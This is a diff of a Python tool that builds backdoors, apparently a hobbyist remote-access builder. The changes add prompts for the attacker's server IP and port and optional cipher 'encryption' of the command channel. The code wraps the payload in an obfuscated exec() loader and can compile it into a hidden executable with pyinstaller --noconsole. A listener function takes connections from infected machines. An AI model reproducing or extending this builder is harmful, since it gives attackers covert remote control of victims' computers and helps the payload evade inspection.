@@ -1,36 +1,52 @@
 import socket, time, os, platform
 
-encrypted = list(
-    """í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
-decrypted = list(
-    """ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
+encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
+decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
 
+communications_encryption = True
+
+def file_encrypt(string):
+    if communications_encryption:
+        final = ""
+        for i in list(string):
+            if i == "\n":
+                final += "\n"
+            else:
+                n = decrypted.index(i)
+                final += encrypted[n]
+        return final
+    else:
+        return string
 
 def encrypt(string):
-    final = ""
-    for i in list(string):
-        if i == "\n":
-            final += "\n"
-        else:
-            n = decrypted.index(i)
-            final += encrypted[n]
-    return final
+    if communications_encryption:
+        final = ""
+        for i in list(string):
+            if i == "\n":
+                final += "\n"
+            else:
+                n = decrypted.index(i)
+                final += encrypted[n]
+        return final
+    else:
+        return string
 
 
 def decrypt(string):
-    final = ""
-    for i in list(string):
-        if i == "\n":
-            final += "\n"
-        else:
-            n = encrypted.index(i)
-            final += decrypted[n]
-    return final
-
+    if communications_encryption:
+        final = ""
+        for i in list(string):
+            if i == "\n":
+                final += "\n"
+            else:
+                n = encrypted.index(i)
+                final += decrypted[n]
+        return final
+    else:
+        return string
 
 global author_instagram
 author_instagram = "tchewui"
-
 
 class symbols():
     def __init__(self):
@@ -118,6 +134,21 @@ print(symbols.default("#########################################################
 
 
 def create_backdoor():
+    print("Do you want to compile the backdoor? (Yes/No)")
+    symbols.info("If you compile the backdoor, you can't change it's name")
+    inp = input(">")
+    to_compile = True if inp.lower() == "yes" else False if inp.lower() == "no" else create_backdoor()
+    print("Name to the final file (without extension): ")
+    symbols.warning("If you choosed to compile the file you can't change the name of the executable")
+    final_name = str(input("> "))
+    print("Server IP:")
+    server = str(input("> "))
+    print("Server Port:")
+    port = str(input("> "))
+    print("Communications encryption? (Yes/No): ")
+    symbols.warning("Some characters can't be used with this encryption, don't use encryption if you want to transfer files")
+    encryption = str(input("> "))
+    encryption = True if encryption.lower() == "yes" else False if encryption.lower() == "no" else create_backdoor()
     initial = '''encrypted = list("""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
 decrypted = list("""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
 def decrypt(string):
@@ -129,30 +160,53 @@ def decrypt(string):
             n = encrypted.index(i)
             final += decrypted[n]
     return final
-exec(decrypt({c133679455d4c91047b3b50234aa7ab}))'''
-    print("Do you want to compile the backdoor? (Yes/No)")
-    symbols.info("If you compile the backdoor, you can't change it's name")
-    inp = input(">")
-    to_compile = "True" if inp.lower() == "yes" else "False" if inp.lower() == "no" else create_backdoor()
-    print("Name to the final file (without extension): ")
-    symbols.warning("If you choosed to compile the file you can't change the name of the executable")
-    final_name = str(input("> "))
-    print("Server IP:")
-    server = str(input("> "))
-    print("Server Port")
-    port = str(input("> "))
+exec({0} + decrypt({c133679455d4c91047b3b50234aa7ab}))'''.replace("{0}", '''\'\'\'global encrypted
+global decrypted
+encrypted = list(r"""í4i;aA\oà?QnwjROPÇèÌ_W)y'$M05K"È}bÆeÉá37ZçÔ.YJf+]9:m-%~XxÓTrEv|1p!{8l»Dq&Sd(Í# ,F‡Õg<ãVéÿâ>t[^óhìòGzk/U=«sÀCNÁ*BHuÒ6Âõ2'ÃIôcL""")
+decrypted = list(r"""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| {[()]}áàÁÀãÃâÂçÇéÉÈèíÍÌìóÓòÒõÕôÔ:.,;"'ÿ‡Æ""")
+{encryption}\n\'\'\'''')
+
+    if encryption:
+        initial = initial.replace("{encryption}", """
+def encrypt(string):
+    final = ""
+    for i in list(string):
+        if i == "\\\\n":
+            final += "\\\\n"
+        else:
+            n = decrypted.index(i)
+    final += encrypted[n]
+    return final
+def decrypt(string):
+    final = ""
+    for i in list(string):
+        if i == "\\\\n":
+            final += "\\\\n"
+        else:
+            n = encrypted.index(i)
+            final += decrypted[n]
+    return final\\n\'\'\'
+    """)
+    elif not encryption:###########################################################
+        initial = initial.replace("{encryption}","""
+def encrypt(string):
+    return string
+def decrypt(string):
+    return string
+        """)
+
     symbols.info("Construction in progress")
     with open("backdoor_decrypted.py", encoding="utf-8") as file:
         decrypted_backdoor = file.read()
-    encrypted_backdoor = encrypt(decrypted_backdoor.replace("{cb5185196ad3147d58c13c22b2a32292}", to_compile).replace(
-        "{8f8c6b7b02405c7ab1027019e69a81e1}", final_name + ".exe" if bool(to_compile) else ".py").replace(
+    encrypted_backdoor = file_encrypt(decrypted_backdoor.replace("{cb5185196ad3147d58c13c22b2a32292}", str(to_compile)).replace(
+        "{8f8c6b7b02405c7ab1027019e69a81e1}", final_name + ".exe" if to_compile else ".py").replace(
         "{cf1e8c14e54505f60aa10ceb8d5d8ab3}", server).replace("{901555fb06e346cb065ceb9808dcfc25}", port))
     symbols.info("Encrypted version of the backdoor created, making final file...")
-    final_backdoor = initial.replace("{c133679455d4c91047b3b50234aa7ab}", encrypted_backdoor)
-    with open(final_name + ".py", "w") as file:
-        file.write(final_backdoor)
-    symbols.info("Python file created")
-    if bool(to_compile):
+    final_backdoor = initial.replace("{c133679455d4c91047b3b50234aa7ab}", "'''" + encrypted_backdoor + "'''")
+    with open(final_name + ".py", "w", encoding="utf-8") as file:
+        file.write(final_backdoor.replace("\\a", "\\\\a"))
+    symbols.info("Python file created on " + os.getcwd())
+    if to_compile:
         symbols.info("Compiling file...")
         try:
             os.system("pyinstaller %s --onefile --noconsole" % (final_name + ".py"))
@@ -167,11 +221,23 @@ exec(decrypt({c133679455d4c91047b3b50234aa7ab}))'''
         except:
             symbols.error("Error, please install pyinstaller or manually compile " + final_name + ".py")
             changeMenu()
-
+    changeMenu()
 
 def listen():
     try:
         listen_port = int(input(symbols.default("Listening port : "))) ## to 65535
+        print("Communications encryption? (Yes/No): ")
+        symbols.info("You had to choose this option on the backdoor creation")
+        global communications_encryption
+        communications_encryption = str(input("> "))
+        communications_encryption = True if communications_encryption.lower() == "yes" else False if communications_encryption.lower() == "no" else create_backdoor()
+        if communications_encryption:
+            pass
+        elif not communications_encryption:
+            def encrypt(string):
+                return string
+            def decrypt(string):
+                return string
         symbols.info("Listening on port " + str(listen_port))
         if (listen_port > 0 and listen_port < 65535):
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -334,8 +400,6 @@ def changeMenu():
     else:
         print(symbols.error("Invalid value, please try again:"))
         changeMenu()
-
-    print(current_menu)
 
     if (current_menu == "1"):
         create_backdoor()
